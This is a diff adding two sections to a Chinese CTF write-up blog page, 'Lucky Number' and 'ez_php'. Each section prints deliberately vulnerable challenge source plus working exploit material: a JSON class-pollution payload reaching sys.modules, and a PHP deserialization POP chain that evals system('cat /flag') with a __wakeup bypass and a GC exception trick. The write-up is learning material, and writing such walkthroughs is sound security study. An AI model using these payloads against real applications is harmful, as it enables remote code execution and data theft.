@@ -291,6 +291,8 @@
             <li><a href="#fin-back-to-the-future">[Fin] Back to the future</a></li>
             <li><a href="#fin-jinja-mark">[Fin] Jinja Mark</a></li>
             <li><a href="#fin-just-readme-前置">[Fin] Just Readme (前置)</a></li>
+            <li><a href="#fin-lucky-number">[Fin] Lucky Number</a></li>
+            <li><a href="#fin-ez_php">[Fin] ez_php</a></li>
           </ol>
         </li>
       </ol>
@@ -1966,6 +1968,743 @@
 	loading="lazy"
 	
 		alt="image-20240920111821314"
+	
+	
+></p>
+<hr>
+<h4 id="fin-lucky-number">[Fin] Lucky Number
+</h4><p>源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">flask</span> <span class="n">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span><span class="p">,</span><span class="n">render_template_string</span><span class="p">,</span><span class="n">render_template</span>
+</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">jinja2</span> <span class="n">import</span> <span class="n">Template</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">json</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">heaven</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="n">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="n">dict</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="n">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="n">dict</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">cls</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="n">cls</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BLACKLIST_IN_index</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;{&#39;</span><span class="p">,</span><span class="s1">&#39;}&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_json</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">True</span>
+</span></span><span class="line"><span class="cl">    <span class="n">except</span> <span class="n">ValueError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/m4G1c&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pollute</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">is_json</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">),</span> <span class="n">instance</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="n">heaven</span><span class="o">.</span><span class="n">create</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">message</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s2">&#34;message&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;这个魔术还行吧</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34; + message</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;我要json的魔术&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;记得用POST方法把魔术交上来&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#heaven.py</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">kon</span><span class="o">=</span><span class="s2">&#34;Kon&#34;</span><span class="p">,</span> <span class="n">pure</span><span class="o">=</span><span class="s2">&#34;Pure&#34;</span><span class="p">,</span> <span class="o">*</span><span class="p">,</span> <span class="n">confirm</span><span class="o">=</span><span class="n">False</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">confirm</span> <span class="ow">and</span> <span class="s2">&#34;lucky_number&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">create</span><span class="o">.</span><span class="n">__kwdefaults__</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？&#34;</span><span class="p">,</span> <span class="s2">&#34;lucky_number&#34;</span><span class="p">:</span> <span class="s2">&#34;nope&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">confirm</span> <span class="ow">and</span> <span class="s2">&#34;lucky_number&#34;</span> <span class="ow">in</span> <span class="n">create</span><span class="o">.</span><span class="n">__kwdefaults__</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;这是你的lucky_number，请拿好，去/check下检查一下吧&#34;</span><span class="p">,</span> <span class="s2">&#34;lucky_number&#34;</span><span class="p">:</span> <span class="n">create</span><span class="o">.</span><span class="n">__kwdefaults__</span><span class="p">[</span><span class="s2">&#34;lucky_number&#34;</span><span class="p">]}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;你有什么想创造的吗？&#34;</span><span class="p">,</span> <span class="s2">&#34;lucky_number&#34;</span><span class="p">:</span> <span class="s2">&#34;nope&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解题重点是这两个属性</p>
+<p><img src="/img/image-20240920165353562.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240920165353562"
+	
+	
+></p>
+<p>怎么导入sys模块呢，看了官方wp才知道在python中存在着**<strong>spec</strong><strong>内置属性，包含了关于类加载时的信息，定义在Lib/importlib/_bootstrap.py的类ModuleSpec，所以可以直接采用</strong>&lt;模块名&gt;.<strong>spec</strong>.<strong>init</strong>.<strong>globals</strong>[&lsquo;sys&rsquo;]**获取到sys模块，此处导入了json模块就可以使用json模块获取</p>
+<p>payload,拿去json格式化一下即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;__init__&#34;:{&#34;__globals__&#34;:{&#34;json&#34;:{&#34;__sepc__&#34;:{&#34;__init__&#34;:{&#34;__globals__&#34;:{&#34;sys&#34;:{&#34;modules&#34;:{&#34;heaven&#34;:{&#34;create&#34;:{&#34;__kwdefaults__&#34;:{&#34;confirm&#34;:&#34;true&#34;,&#34;lucky_number&#34;:&#34;5346&#34;}}}}}}}}}}}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>传参后提示去/check检查一下</p>
+<p><img src="/img/image-20240920172419635.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240920172419635"
+	
+	
+></p>
+<p>检查成功了，去对应目录ssti</p>
+<p><img src="/img/image-20240920172453507.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240920172453507"
+	
+	
+></p>
+<p>这里利用os._wrap_close中的popen方法直接执行命令即可，模块方法有很多</p>
+<p><img src="/img/image-20240920172618248.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240920172618248"
+	
+	
+></p>
+<hr>
+<h4 id="fin-ez_php">[Fin] ez_php
+</h4><p>这道题出现了很多新知识，比如引用绕过，php GC回收攻击，mb_substr,mb_strpos字符串逃逸，理解清楚后算是收益颇丰，参考文章：</p>
+<p>()[<a class="link" href="https://chenxi9981.github.io/ctfshow_XGCTF_%e8%a5%bf%e7%93%9c%e6%9d%af/"  target="_blank" rel="noopener"
+    >ctfshow_XGCTF_西瓜杯 | 晨曦的个人小站 (chenxi9981.github.io)</a>]</p>
+<p>()[<a class="link" href="https://chenxi9981.github.io/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/"  target="_blank" rel="noopener"
+    >(ฅ&gt;ω&lt;*ฅ) 噫又好啦 ~php反序列化 | 晨曦的个人小站 (chenxi9981.github.io)</a>]</p>
+<p>源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="n">highlight_file</span><span class="p">(</span><span class="n">__file__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">function</span> <span class="n">substrstr</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">start</span> <span class="o">=</span> <span class="n">mb_strpos</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">,</span> <span class="s2">&#34;[&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">end</span> <span class="o">=</span> <span class="n">mb_strpos</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">,</span> <span class="s2">&#34;]&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">mb_substr</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">,</span> <span class="o">$</span><span class="n">start</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="o">$</span><span class="n">end</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">-</span> <span class="o">$</span><span class="n">start</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">Hacker</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="o">$</span><span class="n">start</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="o">$</span><span class="n">end</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="o">$</span><span class="n">username</span><span class="o">=</span><span class="s2">&#34;hacker&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__construct</span><span class="p">(</span><span class="o">$</span><span class="n">start</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">start</span><span class="o">=$</span><span class="n">start</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">username</span><span class="o">=</span><span class="s2">&#34;hacker&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">end</span> <span class="o">=</span> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">start</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">preg_match</span><span class="p">(</span><span class="s1">&#39;/ctfer/i&#39;</span><span class="p">,</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">echo</span> <span class="s1">&#39;Hacker！&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">C</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="o">$</span><span class="n">c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">c</span><span class="o">-&gt;</span><span class="n">c</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;C&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">T</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="o">$</span><span class="n">t</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__call</span><span class="p">(</span><span class="o">$</span><span class="n">name</span><span class="p">,</span><span class="o">$</span><span class="n">args</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">echo</span> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">t</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">F</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="o">$</span><span class="n">f</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__get</span><span class="p">(</span><span class="o">$</span><span class="n">name</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">E</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="o">$</span><span class="n">e</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__isset</span><span class="p">(</span><span class="o">$</span><span class="n">name</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">e</span><span class="p">)();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">R</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="o">$</span><span class="n">r</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__invoke</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">r</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;ez_ser.from_you&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">ctf</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Hacker</span><span class="p">(</span><span class="s1">&#39;{{{&#39;</span><span class="o">.$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;ez_ser.from_you&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;}}}&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">preg_match</span><span class="p">(</span><span class="s2">&#34;/\[|\]/i&#34;</span><span class="p">,</span> <span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;substr&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">die</span><span class="p">(</span><span class="s2">&#34;NONONO!!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">pre</span> <span class="o">=</span> <span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;substr&#39;</span><span class="p">])</span><span class="err">?</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;substr&#39;</span><span class="p">]:</span><span class="s2">&#34;substr&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">ser_ctf</span> <span class="o">=</span> <span class="n">substrstr</span><span class="p">(</span><span class="o">$</span><span class="n">pre</span><span class="o">.</span><span class="s2">&#34;[&#34;</span><span class="o">.</span><span class="n">serialize</span><span class="p">(</span><span class="o">$</span><span class="n">ctf</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;]&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">a</span> <span class="o">=</span> <span class="n">unserialize</span><span class="p">(</span><span class="o">$</span><span class="n">ser_ctf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">throw</span> <span class="n">new</span> <span class="n">Exception</span><span class="p">(</span><span class="s2">&#34;杂鱼~杂鱼~&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>首先便是构造pop利用链，这道题的是比较好构造的，有个以前不知道的知识点是__get方法中</li>
+</ol>
+<blockquote>
+<p>如果你没有为 <code>t</code> 属性赋值，或者将其设置为 <code>null</code>，那么在调用 <code>$this-&gt;t-&gt;t</code> 时将会抛出一个错误，因为你尝试在一个 <code>null</code> 值上访问属性</p>
+</blockquote>
+<p>以前只知道访问不可访问属性和未定义成员变量可以触发，其实没赋值定义访问属性也能触发</p>
+<p>到Hacker类前这么构造即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$s1 = new R();
+</span></span><span class="line"><span class="cl">$s1-&gt;r = &#34;system(&#39;cat /flag&#39;);&#34;;
+</span></span><span class="line"><span class="cl">$s2 = new E();
+</span></span><span class="line"><span class="cl">$s2-&gt;e = $s1;
+</span></span><span class="line"><span class="cl">$s3 = new F();
+</span></span><span class="line"><span class="cl">$s3-&gt;f = $s2;
+</span></span><span class="line"><span class="cl">$s4 = new T();
+</span></span><span class="line"><span class="cl">$s4-&gt;t = $s3;
+</span></span><span class="line"><span class="cl">$s5 = new C();
+</span></span><span class="line"><span class="cl">$s5-&gt;c = $s4;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后Hacker类中绕过__wakeup方法，因为下面还有个赋值操作$this-&gt;end = $this-&gt;start，我们可以引用赋值来绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$s6-&gt;end = &amp;$s6-&gt;username;
+</span></span><span class="line"><span class="cl">$s6-&gt;start = $s5;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>到这利用链已经基本构造完了，注意源码中还有句<code>throw new Exception(&quot;杂鱼~杂鱼~&quot;);</code>抛出异常会导致__destruct析构方法无法执行从而导致反序列化过程失败</p>
+<p>绕过抛出异常就需要利用到PHP的GC垃圾回收机制，我举个例：本地开个php服务器执行以下代码进行测试</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">highlight_file(__FILE__);
+</span></span><span class="line"><span class="cl">$flag = &#34;flag{test_flag}&#34;;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class B {
+</span></span><span class="line"><span class="cl">  function __destruct() {
+</span></span><span class="line"><span class="cl">    global $flag;
+</span></span><span class="line"><span class="cl">    echo $flag;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$a = unserialize($_GET[&#39;ctf&#39;]);
+</span></span><span class="line"><span class="cl">throw new Exception(&#39;nonono&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>构造一个payload</p>
+<p><img src="/img/image-20240921164210557.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240921164210557"
+	
+	
+></p>
+<p>传入后发现提前执行了析构方法echo $flag,利用成功</p>
